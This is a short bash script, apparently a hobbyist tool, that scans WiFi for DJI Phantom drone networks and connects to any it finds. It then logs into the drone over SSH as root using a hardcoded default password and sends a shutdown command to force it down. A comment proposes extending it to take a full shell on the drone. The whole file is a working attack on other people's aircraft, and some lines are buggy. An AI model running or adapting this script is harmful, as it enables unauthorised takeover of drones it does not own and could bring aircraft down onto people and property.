#!/bin/bash

# phantom-drone-pwn.sh version 0.0 

# Force land that stupid Phantom drone that sounds like a weedwhacker and flies directly outside my window at night. 
# Should not be used without adult supervision.

# Written by Blake Frederick

while true; do

## Detect the Phantom drone's WiFi network
NETWORKLIST=`iw wlan0 scan | grep SSID | cut -f 1 -d ' ' --complement` 
NOW=$(date +"%m-%d-%y-%T")
echo $NETWORKLIST > "network-scan-$NOW.txt" # log all detected networks

if !($NETWORKLIST | grep hantom); then
	echo "No Phantom drones detected"
else
	echo "Phantom drone found!"
	echo $NETWORKLIST | grep hantom
	
	## Connect to the drone's WiFi network
	echo "Attempting to connect to the drone's wireless network..."
	DRONESSID=$NETWORKLIST | grep hantom
	`service network-manager stop` # network manager interferes with iwconfig connecting to a wifi network
	iwconfig wlan0 essid $DRONESSID
	sleep 2

	if !(iwconfig wlan0 | grep $DRONESSID); then
		echo "Failed to associate with the drone on network $DRONESSID"
	else
		echo "Successfully connected to the drone's wifi network"
		echo "Obtaining IP address"
		dhclient wlan0
		MYIP=`ifconfig wlan0 | grep inet | grep -v inet6 | awk '{print $2}'`
		echo "Obtained IP address $MYIP"

		## Probe the drone's LAN and ssh into the drone to shut it down
		if (ping -c1 192.168.1.10 | grep from); then
			echo "Camera detected at 192.168.1.10"
		fi
		if (ping -c1 192.168.1.2 | grep from); then
			echo "Drone WiFi extender detected at 192.168.1.2"
		fi
		if (ping -c1 192.168.1.1 | grep from); then
			echo "Drone device detected at 192.168.1.1"
			echo "Attempting to reboot drone over ssh..."

			# Use the manufacturer's default root password
			# @TODO: Could be modified to get a shell on the drone instead of just shutting it down
			/usr/bin/expect <<EOF
			spawn ssh -oStrictHostKeyChecking=no -oCheckHostIP=no root@192.168.1.1'
			expect "*?assword: "
			sleep 2
			send -- "19881209\n"
			sleep 2 
			send "shutdown -h now"
			expect eof
			EOF
			echo "Goodnight drone."
		else
			echo "Could not connect to the drone."
		fi
	fi
fi
sleep 30
done
